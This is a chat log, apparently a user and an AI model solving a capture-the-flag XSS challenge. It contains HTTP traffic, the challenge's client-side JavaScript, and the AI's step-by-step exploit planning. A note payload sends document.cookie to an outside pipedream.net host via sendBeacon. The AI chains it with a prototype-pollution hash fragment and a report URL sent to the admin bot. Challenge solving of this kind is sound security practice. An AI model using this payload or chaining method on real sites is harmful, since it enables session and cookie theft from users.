+{"success":true,"id":"f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28","url":"/note/f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28"}"
+"
+"GET /note/f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28/summary/manifest.json?note=f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28 HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+Sec-Ch-Ua-Platform: "Windows"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+Accept: application/json
+Sec-Ch-Ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i
+"
+"HTTP/2 200 OK
+Date: Tue, 21 Apr 2026 04:29:20 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 90
+X-Powered-By: Express
+Content-Security-Policy: default-src 'self'; script-src 'nonce-h6GkmtdZkkH9ZdIyX4pRcw==' 'strict-dynamic'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src *; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+Etag: W/"5a-xpejJnk2niFUmVKyLj+WXoyjCw8"
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+{"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}"
+"POST /api/report HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+Content-Length: 80
+Sec-Ch-Ua-Platform: "Windows"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Origin: https://challenge-0426.intigriti.io
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i
+{"url":"/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f"}"
+"HTTP/2 200 OK
+Date: Tue, 21 Apr 2026 04:11:14 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 53
+X-Powered-By: Express
+Content-Security-Policy: default-src 'self'; script-src 'nonce-qQiWD9eKX/e5skd3qBEsXw==' 'strict-dynamic'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src *; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+Etag: W/"35-BSPby02ezzksiMphZXFux4KCPaY"
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+{"message":"A reviewer will open this page shortly."}"
+maybe we need to look at the report request to the post and modify the url?
+Also, the open angle bracket is encoded in the DOM.
+"  <script nonce="cMEPsfwRFqP1fY4tMxQ2mQ==">
+    window.__APP_INIT__     = {"theme":"dark","panel":"summary","noteId":"f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28"};
+    window.__NOTE_CONTENT__ = "\u003cdiv id=\"enhance-config\" data-types=\"custom\">\u003c/div>\u003cdiv data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\">\u003c/div>";
+  </script>"Show more10:17 AMClaude responded: Key observations from the new data:Identified missing test for reader panel manifest endpointIdentified missing test for reader panel manifest endpointLet me analyze what the user has shared:
+
+Account preferences show TWO presets:
+
+"summary": {"widgetTypes":["custom"],"widgetSink":"script"} - no renderMode
+"reader": {"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"} - has renderMode (probably set earlier by mistake)
+
+
+Note created: f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28
+Summary manifest (fetched for the new note) still returns: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+Still hardcoded for "summary" panel
+
+
+The report was sent with the old note ID (e6007144403f...), NOT the new one. And no hash fragment for PP.
+The NOTE_CONTENT shows \u003c which is < encoded. This is important - the content IS stored correctly.
+
+Key observations:
+
+The user has NOT tested the custom "reader" panel manifest yet
+The report was sent to the wrong note (old one) without hash PP
+The user still hasn't tested GET /note/{id}/reader/manifest.json?note={id}
+
+Also important: the user says "the open angle bracket is encoded in the DOM" - they're seeing \u003c in the NOTE_CONTENT. This is fine - it's just JSON string encoding. When JavaScript parses this string, \u003c becomes <. The actual content is fine.
+What needs to happen next:
+
+Test the "reader" custom panel manifest: GET /note/f7a94.../reader/manifest.json?note=f7a94...
+If it returns the reader preset (without renderMode ideally), proceed
+Report the NEW note with the reader panel + hash PP
+
+But wait - the user's "reader" preset has "renderMode":"full" in it. That's actually FINE for us! If the server returns {profile: {renderMode: "full", widgetTypes: ["custom"], widgetSink: "script"}}, that directly sets APP.renderMode = 'full' without needing PP!
+So if the custom "reader" panel uses the preset, even with the renderMode: "full" in it, the attack works WITHOUT needing prototype pollution at all!
+…Show lessDoneKey observations from the new data:
+
+Reader preset stored: "reader":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"} — this actually has renderMode:"full" in it already, so PP might not even be needed if the server uses it
+Wrong note reported — you reported e6007144... (old), not f7a94bf0... (new)
+Summary panel manifest still hardcoded — as expected, known panels ignore presets
+
+Next: test if the "reader" custom panel manifest works:
+GET /note/f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28/reader/manifest.json?note=f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28
+Two possible responses:
+
+{"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}} → attack works without PP
+{"profile":{"widgetTypes":["custom"],"widgetSink":"script"}} → works with hash PP
+{"profile":{"renderMode":"safe",...}} → server overrides, need different approach
+
+Then report the correct URL:
+json{"url": "/note/f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28/reader#constructor[prototype][renderMode]=full"}
+The hash PP is a safety net — if the manifest includes renderMode:"full" directly, it's not needed at all. The \u003c encoding is fine, JSON parser decodes it to < when assigning to window.__NOTE_CONTENT__.You said: Can you look at the code once again.Can you look at the code once again.10:24 AMClaude responded: Key things I spotted re-reading carefully:Scrutinized code flow and identified critical testing gapsScrutinized code flow and identified critical testing gapsLet me re-read the app.js code carefully, particularly focusing on things I might have missed.Re-read full app.js carefullybashcat /home/claude/CTF/app.jsOutput(function () {
+  'use strict';
+
+  var APP = window.__APP_INIT__ || {};
+
+  var DEFAULTS = {
+    maxNoteLength: 50000,
+    searchDebounce: 300,
+    apiBase: '/api'
+  };
+
+  var ACCOUNT_PREFERENCES_API = DEFAULTS.apiBase + '/account/preferences';
+
+  // Settings helpers.
+
+  function mergeFormData(target, source) {
+    if (!source || typeof source !== 'object') return target;
+    var keys = Object.keys(source);
+    for (var i = 0; i < keys.length; i++) {
+      var k = keys[i];
+      if (!Object.prototype.hasOwnProperty.call(source, k)) continue;
+      if (typeof source[k] === 'object' && source[k] !== null) continue;
+      target[k] = source[k];
+    }
+    return target;
+  }
+
+  function getOwnString(obj, key, fallback) {
+    if (Object.prototype.hasOwnProperty.call(obj, key) && typeof obj[key] === 'string') {
+      return obj[key];
+    }
+    return fallback;
+  }
+
+  function getOwnArray(obj, key) {
+    if (Object.prototype.hasOwnProperty.call(obj, key) && Array.isArray(obj[key])) {
+      return obj[key];
+    }
+    return [];
+  }
+
+  // Hash-based appearance preferences.
+
+  function setNestedValue(obj, path, value) {
+    var keys = path.replace(/\]/g, '').split('[');
+    var current = obj;
+    for (var i = 0; i < keys.length - 1; i++) {
+      var k = keys[i];
+      if (k === '__proto__') return;
+      if (
+        current[k] == null ||
+        (typeof current[k] !== 'object' && typeof current[k] !== 'function')
+      ) {
+        current[k] = {};
+      }
+      current = current[k];
+    }
+    var last = keys[keys.length - 1];
+    if (last !== '__proto__') {
+      current[last] = value;
+    }
+  }
+
+  function parseThemeParams() {
+    var hash = location.hash;
+    if (!hash || hash.length < 2) return;
+    var raw = hash.substring(1);
+    var pairs = raw.split('&');
+    var result = {};
+
+    for (var i = 0; i < pairs.length; i++) {
+      var idx = pairs[i].indexOf('=');
+      if (idx === -1) continue;
+      try {
+        var key = decodeURIComponent(pairs[i].substring(0, idx));
+        var val = decodeURIComponent(pairs[i].substring(idx + 1));
+        setNestedValue(result, key, val);
+      } catch (e) {
+        continue;
+      }
+    }
+
+    if (result.theme)  APP.theme  = result.theme;
+    if (result.font)   document.body.style.fontFamily = result.font;
+    if (result.accent) document.documentElement.style.setProperty('--accent', result.accent);
+    if (result.bg)     document.documentElement.style.setProperty('--bg-primary', result.bg);
+  }
+
+  // Remote layout manifest.
+
+  function applyRemoteProfile(profile) {
+    if (!profile || typeof profile !== 'object') return;
+
+    if (typeof profile.renderMode === 'string') {
+      APP.renderMode = profile.renderMode;
+    }
+
+    if (Array.isArray(profile.widgetTypes)) {
+      APP.widgetTypes = profile.widgetTypes
+        .filter(function (value) { return typeof value === 'string'; })
+        .slice(0, 8);
+    }
+
+    if (typeof profile.widgetSink === 'string') {
+      APP.widgetSink = profile.widgetSink;
+    }
+
+    if (typeof profile.theme === 'string') {
+      APP.theme = profile.theme;
+    }
+  }
+
+  function loadPanelManifest() {
+    if (typeof window.__NOTE_CONTENT__ !== 'string') {
+      return Promise.resolve();
+    }
+
+    var panel  = typeof APP.panel === 'string' ? APP.panel : 'summary';
+    var noteId = typeof APP.noteId === 'string' ? APP.noteId : '';
+    if (!noteId) return Promise.resolve();
+
+    var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
+      '/manifest.json?note=' + encodeURIComponent(noteId);
+
+    return fetch(target, {
+      headers: { 'Accept': 'application/json' }
+    })
+      .then(function (r) {
+        if (!r.ok) return null;
+        return r.json();
+      })
+      .then(function (data) {
+        if (data && data.profile) {
+          applyRemoteProfile(data.profile);
+        }
+      })
+      .catch(function () {});
+  }
+
+  // Content policies.
+
+  function loadContentPolicies() {
+    var mode = getOwnString(APP, 'renderMode', 'safe');
+    return {
+      allowForms:         mode === 'full',
+      allowIds:           mode === 'full',
+      allowDataAttrs:     mode === 'full',
+      enableEnhancements: mode === 'full'
+    };
+  }
+
+  // DOMPurify config.
+
+  function getSanitizeConfig() {
+    var cfg = {
+      ALLOWED_TAGS: [
+        'h1','h2','h3','h4','h5','h6',
+        'p','br','hr',
+        'b','i','u','em','strong','del','ins','sub','sup','mark',
+        'a','img',
+        'ul','ol','li',
+        'blockquote','code','pre','kbd','samp',
+        'table','caption','thead','tbody','tfoot','tr','th','td',
+        'span','div',
+        'figure','figcaption',
+        'abbr','cite','q','small','time','var',
+        'dl','dt','dd'
+      ],
+      ALLOWED_ATTR: [
+        'href','src','alt','title',
+        'class','style',
+        'target','rel',
+        'width','height',
+        'colspan','rowspan','scope',
+        'cite','datetime','lang','dir'
+      ],
+      ALLOW_DATA_ATTR: false
+    };
+
+    var policies = loadContentPolicies();
+
+    if (policies.allowForms) {
+      cfg.ALLOWED_TAGS = cfg.ALLOWED_TAGS.concat([
+        'form','input','select','option','textarea',
+        'label','fieldset','legend',
+        'details','summary','dialog',
+        'meter','progress','output'
+      ]);
+    }
+
+    if (policies.allowIds) {
+      cfg.ALLOWED_ATTR = cfg.ALLOWED_ATTR.concat([
+        'id','name','value','type','placeholder',
+        'for','method','action',
+        'checked','selected','disabled','readonly',
+        'required','pattern','autocomplete',
+        'rows','cols','wrap','maxlength','minlength',
+        'multiple','size','accept','list',
+        'open','tabindex','role',
+        'min','max','step','low','high','optimum',
+        'aria-label','aria-describedby'
+      ]);
+    }
+
+    if (policies.allowDataAttrs) {
+      cfg.ALLOW_DATA_ATTR = true;
+    }
+
+    return cfg;
+  }
+
+  function sanitize(html) {
+    if (typeof DOMPurify === 'undefined') return '';
+    return DOMPurify.sanitize(html, getSanitizeConfig());
+  }
+
+  // Post-sanitisation data attribute filter.
+
+  var UNSAFE_CONTENT_RE = /script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval/i;
+
+  function postSanitize(html) {
+    var temp = document.createElement('div');
+    temp.innerHTML = html;
+    temp.querySelectorAll('*').forEach(function (el) {
+      var attrs = el.attributes;
+      for (var i = attrs.length - 1; i >= 0; i--) {
+        var attr = attrs[i];
+        if (attr.name.indexOf('data-') === 0 && UNSAFE_CONTENT_RE.test(attr.value)) {
+          el.removeAttribute(attr.name);
+        }
+      }
+    });
+    return temp.innerHTML;
+  }
+
+  // Note rendering.
+
+  function renderNoteContent() {
+    var display = document.getElementById('note-display');
+    var content = window.__NOTE_CONTENT__;
+    if (!display || typeof content !== 'string') return;
+
+    var clean = sanitize(content);
+    var safe  = postSanitize(clean);
+    display.innerHTML = safe;
+
+    display.querySelectorAll('a[href]').forEach(function (a) {
+      if (a.hostname !== location.hostname) {
+        a.setAttribute('rel', 'noopener noreferrer');
+        a.setAttribute('target', '_blank');
+      }
+    });
+
+    display.querySelectorAll('img').forEach(function (img) {
+      img.loading = 'lazy';
+      img.onerror = function () { this.style.display = 'none'; };
+    });
+  }
+
+  // Inline enhancements.
+
+  function initContentEnhancements() {
+    var container = document.getElementById('note-display');
+    if (!container) return;
+
+    var observer = new MutationObserver(function () {
+      processEnhancements(container);
+    });
+    observer.observe(container, { childList: true, subtree: true });
+  }
+
+  function processEnhancements(root) {
+    var policies = loadContentPolicies();
+    if (!policies.enableEnhancements) return;
+
+    var manifestTypes = getOwnArray(APP, 'widgetTypes');
+    if (!manifestTypes.length) return;
+
+    var configEl = document.getElementById('enhance-config');
+    if (!configEl) return;
+    var allowedTypes = (configEl.dataset.types || '').split(',');
+
+    root.querySelectorAll('[data-enhance]:not([data-processed])').forEach(function (el) {
+      el.dataset.processed = '1';
+      var type = el.dataset.enhance;
+      if (allowedTypes.indexOf(type) === -1) return;
+      if (manifestTypes.indexOf(type) === -1) return;
+
+      switch (type) {
+        case 'counter':
+          animateCounter(el);
+          break;
+        case 'progress':
+          animateProgress(el);
+          break;
+        case 'custom':
+          loadCustomWidget(el);
+          break;
+      }
+    });
+  }
+
+  function animateCounter(el) {
+    var target = parseInt(el.dataset.to || '100', 10);
+    var current = 0;
+    var step = Math.max(1, Math.floor(target / 60));
+    var timer = setInterval(function () {
+      current = Math.min(current + step, target);
+      el.textContent = current;
+      if (current >= target) clearInterval(timer);
+    }, 16);
+  }
+
+  function animateProgress(el) {
+    var pct = parseInt(el.dataset.pct || '0', 10);
+    el.style.width = '0%';
+    el.style.transition = 'width 1s ease';
+    requestAnimationFrame(function () {
+      el.style.width = Math.min(pct, 100) + '%';
+    });
+  }
+
+  function loadCustomWidget(el) {
+    if (getOwnString(APP, 'widgetSink', 'text') !== 'script') return;
+
+    var cfg = el.dataset.cfg;
+    if (!cfg || cfg.length > 512) return;
+    var s = document.createElement('script');
+    s.textContent = cfg;
+    document.head.appendChild(s);
+  }
+
+  // Search.
+
+  var searchTimer = null;
+
+  function initSearch() {
+    var input   = document.getElementById('search-input');
+    var results = document.getElementById('search-results');
+    if (!input || !results) return;
+
+    input.addEventListener('input', function () {
+      clearTimeout(searchTimer);
+      var q = this.value.trim();
+      if (q.length < 2) { results.innerHTML = ''; return; }
+
+      searchTimer = setTimeout(function () {
+        fetch(DEFAULTS.apiBase + '/search?q=' + encodeURIComponent(q))
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            if (!data.results || !data.results.length) {
+              results.innerHTML = '<div class="no-results">No notes found</div>';
+              return;
+            }
+            results.innerHTML = data.results.map(function (n) {
+              return '<a href="/note/' + encodeURIComponent(n.id) +
+                     '" class="search-result">' + escapeHtml(n.title) + '</a>';
+            }).join('');
+          })
+          .catch(function () {
+            results.innerHTML = '<div class="no-results">Search failed</div>';
+          });
+      }, DEFAULTS.searchDebounce);
+    });
+  }
+
+  // Local note history.
+
+  var STORAGE_KEY = 'chainnotes_my_ids';
+
+  function getSavedIds() {
+    try {
+      var raw = localStorage.getItem(STORAGE_KEY);
+      if (!raw) return [];
+      var ids = JSON.parse(raw);
+      return Array.isArray(ids) ? ids : [];
+    } catch (e) {
+      return [];
+    }
+  }
+
+  function saveNoteId(id) {
+    var ids = getSavedIds();
+    if (ids.indexOf(id) === -1) {
+      ids.unshift(id);
+      if (ids.length > 200) ids = ids.slice(0, 200);
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(ids));
+    }
+  }
+
+  function loadPrivateNotes() {
+    var grid  = document.getElementById('private-notes-grid');
+    var empty = document.getElementById('private-notes-empty');
+    if (!grid) return;
+
+    var ids = getSavedIds();
+    if (!ids.length) return;
+
+    fetch(DEFAULTS.apiBase + '/notes/lookup', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ids: ids })
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (!data.notes) return;
+        var found = data.notes.filter(function (n) { return n.found; });
+        if (!found.length) return;
+        if (empty) empty.style.display = 'none';
+        found.forEach(function (n) {
+          var a = document.createElement('a');
+          a.href = '/note/' + encodeURIComponent(n.id);
+          a.className = 'note-card';
+          var h3 = document.createElement('h3');
+          h3.textContent = n.title;
+          var span = document.createElement('span');
+          span.className = 'note-card-author';
+          span.textContent = n.author;
+          a.appendChild(h3);
+          a.appendChild(span);
+          grid.appendChild(a);
+        });
+      })
+      .catch(function () {});
+  }
+
+  // Note creation.
+
+  function initCreateForm() {
+    var form   = document.getElementById('create-form');
+    var result = document.getElementById('create-result');
+    if (!form) return;
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      var title   = form.querySelector('[name="title"]').value.trim();
+      var content = form.querySelector('[name="content"]').value;
+
+      if (!title || !content) {
+        showResult(result, 'error', 'Title and content are required.');
+        return;
+      }
+
+      fetch(DEFAULTS.apiBase + '/notes', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ title: title, content: content })
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          if (data.success) {
+            saveNoteId(data.id);
+            showResult(result, 'success',
+              'Note created! <a href="' + escapeHtml(data.url) + '">View note &rarr;</a>');
+            form.reset();
+            loadPrivateNotes();
+          } else {
+            showResult(result, 'error', data.error || 'Failed to create note.');
+          }
+        })
+        .catch(function () {
+          showResult(result, 'error', 'Network error.');
+        });
+    });
+  }
+
+  // Settings.
+
+  function loadAccountPreferences() {
+    var form = document.getElementById('settings-form');
+    var meta = document.getElementById('settings-meta');
+
+    return fetch(ACCOUNT_PREFERENCES_API)
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (!data || !data.preferences) return;
+
+        if (form) {
+          setFieldValue(form, 'theme', data.preferences.theme);
+          setFieldValue(form, 'fontSize', data.preferences.fontSize);
+          setFieldValue(form, 'language', data.preferences.language);
+          setFieldValue(form, 'defaultLayout', data.preferences.defaultLayout);
+        }
+
+        if (meta) {
+          var presetCount = data.stats && typeof data.stats.presetCount === 'number'
+            ? data.stats.presetCount
+            : 0;
+          meta.textContent = presetCount
+            ? presetCount + ' reader preset' + (presetCount === 1 ? '' : 's') + ' synced to this account.'
+            : 'Reader presets sync to this account automatically when they are created.';
+        }
+      })
+      .catch(function () {});
+  }
+
+  function initSettingsForm() {
+    var form   = document.getElementById('settings-form');
+    var result = document.getElementById('settings-result');
+    if (!form) return;
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      var payload = {};
+      new FormData(form).forEach(function (v, k) {
+        payload[k] = isNaN(v) ? v : Number(v);
+      });
+
+      var merged = {};
+      mergeFormData(merged, payload);
+
+      fetch(ACCOUNT_PREFERENCES_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(merged)
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          if (data.success) {
+            if (data.preferences && typeof data.preferences.theme === 'string') {
+              APP.theme = data.preferences.theme;
+              applyTheme();
+            }
+            loadAccountPreferences();
+            showResult(result, 'success', 'Settings saved.');
+          } else {
+            showResult(result, 'error', data.error || 'Failed.');
+          }
+        })
+        .catch(function () {
+          showResult(result, 'error', 'Network error.');
+        });
+    });
+  }
+
+  // Review request.
+
+  function initReportButton() {
+    var btn    = document.getElementById('report-btn');
+    var result = document.getElementById('report-result');
+    if (!btn) return;
+
+    btn.addEventListener('click', function () {
+      btn.disabled = true;
+      var url = location.pathname + location.search + location.hash;
+
+      fetch(DEFAULTS.apiBase + '/report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: url })
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          showResult(result, data.success || data.message ? 'success' : 'error',
+            data.message || data.error);
+          setTimeout(function () { btn.disabled = false; }, 10000);
+        })
+        .catch(function () {
+          showResult(result, 'error', 'Network error.');
+          btn.disabled = false;
+        });
+    });
+  }
+
+  // Theme.
+
+  function applyTheme() {
+    document.documentElement.setAttribute('data-theme', APP.theme || 'dark');
+  }
+
+  // Utilities.
+
+  function setFieldValue(form, name, value) {
+    var field = form.querySelector('[name="' + name + '"]');
+    if (!field || value == null) return;
+    field.value = value;
+  }
+
+  function escapeHtml(str) {
+    var d = document.createElement('div');
+    d.textContent = str;
+    return d.innerHTML;
+  }
+
+  function showResult(el, type, msg) {
+    if (!el) return;
+    el.className = 'result-msg result-' + type;
+    el.innerHTML = msg;
+    el.style.display = 'block';
+    setTimeout(function () { el.style.display = 'none'; }, 8000);
+  }
+
+  // Init.
+
+  document.addEventListener('DOMContentLoaded', async function () {
+    parseThemeParams();
+    await loadPanelManifest();
+    applyTheme();
+    initContentEnhancements();
+    renderNoteContent();
+    initSearch();
+    initCreateForm();
+    initSettingsForm();
+    initReportButton();
+    loadPrivateNotes();
+    loadAccountPreferences();
+  });
+})();
+Now I'm reading the code very carefully. Let me spot something I might have missed before.
+Key observations:
+
+initReportButton — the report button sends location.pathname + location.search + location.hash. This is the CURRENT page URL, not a custom URL. The bot report via API accepts a url field in the POST body, but the page's report button sends the full location URL including hash.
+parseThemeParams — only applied to: result.theme → APP.theme, result.font → body.fontFamily, result.accent → --accent, result.bg → --bg-primary. Nothing else from result is assigned to APP directly.
+setNestedValue — can do prototype pollution via constructor[prototype] but blocks __proto__.
+The critical issue with PP approach: setNestedValue(result, key, val) sets properties on the result object. After the loop, ONLY result.theme, result.font, result.accent, result.bg are actually used. The PP sets Object.prototype.renderMode = 'full', but this happens REGARDLESS — just by processing the hash.
+loadPanelManifest runs after parseThemeParams(). The manifest URL construction uses panel (not URL-encoded). The panel comes from APP.panel which is server-set.
+
+Wait, I just spotted something CRITICAL I missed before!
+Look at loadPanelManifest:
+jsvar target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
+  '/manifest.json?note=' + encodeURIComponent(noteId);
+panel is NOT URL-encoded! But panel comes from APP.panel which is server-set. The server sets it based on the URL path. We can't control this from the hash.
+BUT WAIT. Let me look at this again. The fetch call in loadPanelManifest:
+jsreturn fetch(target, {
+    headers: { 'Accept': 'application/json' }
+})
+No credentials option. In modern browsers, fetch with same-origin URL defaults to credentials: 'same-origin', meaning cookies ARE sent. But the HAR showed no Cookie header...
+…Show lessDoneKey things I spotted re-reading carefully:
+1. Wrong note reported — you reported e6007144... (old) to bot, not f7a94bf0... (new one with XSS payload).
+2. Bot has NO northstar_profile cookie — it only gets flag=FLAG{...}. So visitor-based presets will always return the default (no session = no user = hardcoded safe). This CONFIRMS the manifest must be creator-based (server looks up the note's creator's presets using ?note= to resolve the creator).
+3. \u003c is fine — JS engine decodes it; __NOTE_CONTENT__ contains actual < at runtime.
+4. report-btn sends full hash — location.pathname + location.search + location.hash. If you're on the note page with the hash in the URL and click the report button, it auto-includes the hash in the report.
+The 3 things to test right now:
+# Test 1: Does the server accept the "reader" panel?
+GET /note/f7a94bf0.../reader
+→ Does __APP_INIT__ show panel:"reader"?
+
+# Test 2: Does manifest use your creator preset?
+GET /note/f7a94bf0.../reader/manifest.json?note=f7a94bf0...
+→ Does it return {"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}?
+
+# Test 3: If yes, report correctly:
+POST /api/report
+{"url": "/note/f7a94bf0a86827b7173d7f658e66a7f8c7dadc15523228f297784e073a3d1f28/reader"}
+If Test 2 returns renderMode:"full" → no PP hash needed, report the plain /reader URL. If it returns the preset WITHOUT renderMode → add #constructor[prototype][renderMode]=full to the reported URL.
